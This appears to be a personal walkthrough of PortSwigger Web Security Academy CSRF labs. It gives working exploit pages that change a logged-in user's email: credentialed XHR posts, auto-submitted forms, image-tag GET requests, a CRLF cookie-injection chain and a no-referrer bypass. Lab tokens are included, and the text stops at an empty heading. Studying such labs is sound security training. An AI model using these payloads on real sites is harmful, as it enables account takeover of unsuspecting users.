# Burp Suite (Cross-site request forgery)

## Lab: CSRF vulnerability with no defenses

A legitimate request to change the URL looks like this

```text
POST /my-account/change-email HTTP/1.1
Host: ac811f431eeaea8bc0c70a9d00860040.web-security-academy.net
Cookie: session=<REDACTED>
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:100.0) Gecko/20100101 Firefox/100.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Origin: https://ac811f431eeaea8bc0c70a9d00860040.web-security-academy.net
Referer: https://ac811f431eeaea8bc0c70a9d00860040.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

email=test123123%40test.com
```

In order to create a CSRF payload, we need to make sure it's a simple request so that the preflight request is not sent. 

```text
<html>

<script>
function put() {
xhr = new XMLHttpRequest();
xhr.open("POST", "https://ac811f431eeaea8bc0c70a9d00860040.web-security-academy.net/my-account/change-email");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("email=test123123%40test.com");
</script>

<body onload="put()">
</body>
</html>
```

## Lab: CSRF where token validation depends on request method

This one was very simple. As the name suggests, we need to change the request method to bypass the CSRF token validation. The portswigger learning material suggest starting with GET requests, so I did just that and it worked right away. 

```html
<html>

<body>

<img src="https://ac341fce1e526d48c09620b8000a009c.web-security-academy.net/my-account/change-email?email=test123@1test123.com"/>

<body>

</html>

```

## Lab: CSRF where token validation depends on token being present

This one is also as the name suggests, just send the request without the token present. 

```html
<html>
    <body>
        <form action="https://ac341f851fd36ff9c04334a00066009d.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

## Lab: CSRF where token is tied to non-session cookie

The wiener user key and token are:
```text
csrfKey=NasDIKNGTlh331nyYBjc3DH3gR0wiqex
csrf=JnRbd0xm0AN1gAwGgyvLx8ImWnAVH8gE
```

carlos user key and token are:
```text
csrfKey=1tPCQvcdJld5TL4Wdd3WKkmqQ7RDLxRd
csrf=N3Jp8GJiixQ5blra9YfwoB13
```

So we need to do a CLRF attack to set the csrfKey to the one I want. Each Set-Cookie can only set one value. 
```
The Set-Cookie HTTP response header is used to send a cookie from the server to the user agent, so that the user agent can send it back to the server later. To send multiple cookies, multiple Set-Cookie headers should be sent in the same response.
```

The answer is below:

```html

<html>

<head></head>

<body>

<img/src="https://acf41ff21f230e97c06294fc00380058.web-security-academy.net/?search=aaaaa%0D%0ASet-Cookie:csrfKey=NasDIKNGTlh331nyYBjc3DH3gR0wiqex" />

<script>

xhr = new XMLHttpRequest();
xhr.open("POST", "https://acf41ff21f230e97c06294fc00380058.web-security-academy.net/my-account/change-email");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("email=abcd%40abcd.com&csrf=JnRbd0xm0AN1gAwGgyvLx8ImWnAVH8gE");

</script>


</body>

</html>
```

Here first we are doing a search query to perform a header injection where we add another Set-Cookie header and our CSRF key. The second one is making a XMLHttpRequest with the associated CSRF value for that key. 


## Lab: CSRF where token is duplicated in cookie

Similar to the above one but the CLRF injection and the POST payload will have the same csrf token this time. 

```html

<html>

<head></head>

<body>

<img/src="https://acf41ff21f230e97c06294fc00380058.web-security-academy.net/?search=aaaaa%0D%0ASet-Cookie:csrfKey=NasDIKNGTlh331nyYBjc3DH3gR0wiqex" />

<script>

xhr = new XMLHttpRequest();
xhr.open("POST", "https://acf41ff21f230e97c06294fc00380058.web-security-academy.net/my-account/change-email");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("email=abcd%40abcd.com&csrf=NasDIKNGTlh331nyYBjc3DH3gR0wiqex");

</script>


</body>

</html>

```


## Lab: CSRF where Referer validation depends on header being present

This one was also pretty simple. They title kinda gives it away but essentially they are using referrer header to check if the request is cross domain and the fallback here is that if the referrer header is missing, they don't do the check at all. So we can make sure that the referrer header is not present from our exploit server when making the cross domain request. 

```html

<html>

<head>
<meta name="referrer" content="no-referrer">
</head>

<body>

<script>

var xhr = new XMLHttpRequest();
xhr.open("POST", "https://ac2e1f921f4807fdc096bf7d00c4005f.web-security-academy.net/my-account/change-email");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("email=tsdfsdfsdf%40test.com");

</script>

</body>

</html>

```

## Lab: CSRF with broken Referer validation

